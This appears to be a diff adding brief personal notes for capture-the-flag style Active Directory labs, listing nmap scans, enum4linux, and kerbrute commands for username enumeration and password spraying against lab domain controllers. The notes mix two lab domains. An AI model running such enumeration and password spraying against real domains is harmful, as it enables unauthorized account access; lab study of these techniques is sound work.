@@ -1,0 +1,12 @@
+use nmap
+ nmap -T4 -A 10.10.10.169 -sC -sV -o nmap  (port 88 on thats means active directory )
+and also
+enum4linux 10.10.10.169 ( identify the user)
+
+to check valid username using
+
+kerbrute userenum -d megabank.local user.txt --dc 10.10.10.169
+
+password guess
+
+kerbrute passwordspray -d scrm.local --dc DC1.scrm.local user.txt ksimpson
